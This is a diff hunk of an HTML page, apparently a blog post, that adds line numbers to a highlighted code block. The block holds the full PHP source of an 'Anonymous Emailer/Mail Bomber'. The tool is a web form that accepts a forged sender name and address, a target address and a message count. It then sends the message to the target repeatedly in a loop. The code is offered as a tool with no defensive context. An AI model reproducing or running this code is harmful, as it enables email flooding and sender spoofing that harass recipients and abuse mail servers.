@@ -37,53 +37,53 @@
 
 <h3>PHP Anonymous Emailer/Mail Bomber Source Code</h3>
 
-<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="x">&amp;lt;html&amp;gt;</span>
-<span class="x">&amp;lt;head&amp;gt;</span>
-<span class="x">  &amp;lt;title&amp;gt;PHP Anonymous Emailer/Mail Bomber&amp;lt;/title&amp;gt;</span>
-<span class="x">&amp;lt;body bgcolor=&quot;black&quot; text=&quot;white&quot;&amp;gt;</span>
-<span class="x">&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;&amp;lt;font size=&quot;5&quot; face=&quot;verdana&quot;&amp;gt;Sender&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">   &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Name:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;input name=&quot;from_name&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
-<span class="x">    &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Email Adress:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;input name=&quot;from_mail&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Reply Adress:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;input name=&quot;email_return&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">  &amp;lt;/div&amp;gt;</span>
-<span class="x">  &amp;lt;font size=&quot;5&quot; face=&quot;verdana&quot;&amp;gt;Recipient Details&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">  &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Recipient Email:&amp;lt;/b&amp;gt;&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;input name=&quot;target&quot; type=&quot;text&quot; size=&quot;50&quot;&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Subject:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;input name=&quot;subject&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Message:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;textarea name=&quot;message&quot; cols=&quot;38&quot; rows=&quot;5&quot;&amp;gt;&amp;lt;/textarea&amp;gt;</span>
-<span class="x">  &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Number Of Messages To Send&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;p&amp;gt;</span>
-<span class="x">    &amp;lt;input name=&quot;messages&quot; type=&quot;text&quot; id=&quot;messages&quot; value=&quot;&quot; size=&quot;15&quot;&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">&amp;lt;br&amp;gt;</span>
-<span class="x">    &amp;lt;input type=submit&amp;gt;</span>
-<span class="x">  &amp;lt;/p&amp;gt;</span>
-<span class="x">&amp;lt;/form&amp;gt;</span>
-<span class="x">   </span><span class="cp">&lt;?php</span>
-       <span class="nv">$header</span><span class="o">=</span><span class="s2">&quot;From:</span><span class="si">$from_name</span><span class="s2">&amp;lt;</span><span class="si">$from_mail</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
-       <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Reply-To:</span><span class="si">$email_return\n</span><span class="s2">&quot;</span><span class="p">;</span>
-       <span class="nv">$message2</span> <span class="o">=</span> <span class="nb">stripcslashes</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
-       <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$messages</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
-        <span class="nb">mail</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message2</span><span class="p">,</span><span class="nv">$header</span><span class="p">);</span>
-       <span class="p">}</span>
-   <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno"> 1</span> <span class="x">&amp;lt;html&amp;gt;</span>
+<span class="lineno"> 2</span> <span class="x">&amp;lt;head&amp;gt;</span>
+<span class="lineno"> 3</span> <span class="x">  &amp;lt;title&amp;gt;PHP Anonymous Emailer/Mail Bomber&amp;lt;/title&amp;gt;</span>
+<span class="lineno"> 4</span> <span class="x">&amp;lt;body bgcolor=&quot;black&quot; text=&quot;white&quot;&amp;gt;</span>
+<span class="lineno"> 5</span> <span class="x">&amp;lt;form action=&quot;&quot; method=&quot;post&quot;&amp;gt;</span>
+<span class="lineno"> 6</span> <span class="x">&amp;lt;br&amp;gt;&amp;lt;font size=&quot;5&quot; face=&quot;verdana&quot;&amp;gt;Sender&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 7</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 8</span> <span class="x">   &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Name:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno"> 9</span> <span class="x">    &amp;lt;input name=&quot;from_name&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
+<span class="lineno">10</span> <span class="x">    &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">11</span> <span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Email Adress:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">12</span> <span class="x">    &amp;lt;input name=&quot;from_mail&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
+<span class="lineno">13</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">14</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">15</span> <span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Reply Adress:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">16</span> <span class="x">    &amp;lt;input name=&quot;email_return&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
+<span class="lineno">17</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">18</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">19</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">20</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">21</span> <span class="x">  &amp;lt;/div&amp;gt;</span>
+<span class="lineno">22</span> <span class="x">  &amp;lt;font size=&quot;5&quot; face=&quot;verdana&quot;&amp;gt;Recipient Details&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">23</span> <span class="x">  &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Recipient Email:&amp;lt;/b&amp;gt;&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">24</span> <span class="x">    &amp;lt;input name=&quot;target&quot; type=&quot;text&quot; size=&quot;50&quot;&amp;gt;</span>
+<span class="lineno">25</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">26</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">27</span> <span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Subject:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">28</span> <span class="x">    &amp;lt;input name=&quot;subject&quot; type=&quot;text&quot; value=&quot;&quot; size=&quot;50&quot;&amp;gt;</span>
+<span class="lineno">29</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">30</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">31</span> <span class="x">    &amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Message:&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;br&amp;gt;</span>
+<span class="lineno">32</span> <span class="x">    &amp;lt;textarea name=&quot;message&quot; cols=&quot;38&quot; rows=&quot;5&quot;&amp;gt;&amp;lt;/textarea&amp;gt;</span>
+<span class="lineno">33</span> <span class="x">  &amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;font size=&quot;2&quot; face=&quot;verdana&quot;&amp;gt;&amp;lt;b&amp;gt;Number Of Messages To Send&amp;lt;/b&amp;gt;&amp;lt;/font&amp;gt;&amp;lt;p&amp;gt;</span>
+<span class="lineno">34</span> <span class="x">    &amp;lt;input name=&quot;messages&quot; type=&quot;text&quot; id=&quot;messages&quot; value=&quot;&quot; size=&quot;15&quot;&amp;gt;</span>
+<span class="lineno">35</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">36</span> <span class="x">&amp;lt;br&amp;gt;</span>
+<span class="lineno">37</span> <span class="x">    &amp;lt;input type=submit&amp;gt;</span>
+<span class="lineno">38</span> <span class="x">  &amp;lt;/p&amp;gt;</span>
+<span class="lineno">39</span> <span class="x">&amp;lt;/form&amp;gt;</span>
+<span class="lineno">40</span> <span class="x">   </span><span class="cp">&lt;?php</span>
+<span class="lineno">41</span>        <span class="nv">$header</span><span class="o">=</span><span class="s2">&quot;From:</span><span class="si">$from_name</span><span class="s2">&amp;lt;</span><span class="si">$from_mail</span><span class="s2">&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">42</span>        <span class="nv">$header</span> <span class="o">.=</span> <span class="s2">&quot;Reply-To:</span><span class="si">$email_return\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="lineno">43</span>        <span class="nv">$message2</span> <span class="o">=</span> <span class="nb">stripcslashes</span><span class="p">(</span><span class="nv">$message</span><span class="p">);</span>
+<span class="lineno">44</span>        <span class="k">for</span><span class="p">(</span><span class="nv">$x</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$messages</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span><span class="nv">$x</span><span class="o">++</span><span class="p">){</span>
+<span class="lineno">45</span>         <span class="nb">mail</span><span class="p">(</span><span class="nv">$target</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message2</span><span class="p">,</span><span class="nv">$header</span><span class="p">);</span>
+<span class="lineno">46</span>        <span class="p">}</span>
+<span class="lineno">47</span>    <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 
 
